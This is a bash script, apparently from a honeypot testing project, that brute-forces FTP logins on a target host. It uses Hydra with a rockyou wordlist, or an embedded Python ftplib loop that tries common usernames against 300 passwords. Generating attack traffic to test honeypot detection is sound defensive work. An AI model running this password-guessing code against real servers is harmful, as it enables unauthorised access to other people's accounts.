#!/usr/bin/env bash
# B10 - Bruteforce FTP (Hydra) contre le honeypot.
# Usage: bash attacks/run_ftp_brute.sh [host] [port]
set -uo pipefail
HOST="${1:-127.0.0.1}"
PORT="${2:-2121}"
HERE="$(cd "$(dirname "$0")" && pwd)"

echo "[*] FTP bruteforce -> $HOST:$PORT"
if command -v hydra >/dev/null 2>&1; then
  hydra -L "$HERE/../datasets/users.txt" -P "$HERE/../datasets/rockyou-top1000.txt" \
    -t 4 -f "ftp://$HOST:$PORT" || true
else
  echo "[!] hydra absent -> fallback Python ftplib"
  python3 - "$HOST" "$PORT" "$HERE/../datasets/rockyou-top1000.txt" <<'PY'
import ftplib, sys
host, port, wl = sys.argv[1], int(sys.argv[2]), sys.argv[3]
users = ["root", "admin", "ftp", "anonymous"]
pwds = open(wl, encoding="utf-8", errors="ignore").read().splitlines()
n = 0
for u in users:
    for p in pwds[:300]:
        p = p.strip()
        try:
            f = ftplib.FTP(); f.connect(host, port, timeout=4)
            f.login(u, p); f.quit()
        except Exception:
            pass
        n += 1
print(f"[+] {n} tentatives FTP envoyees")
PY
fi
echo "[+] FTP bruteforce termine."
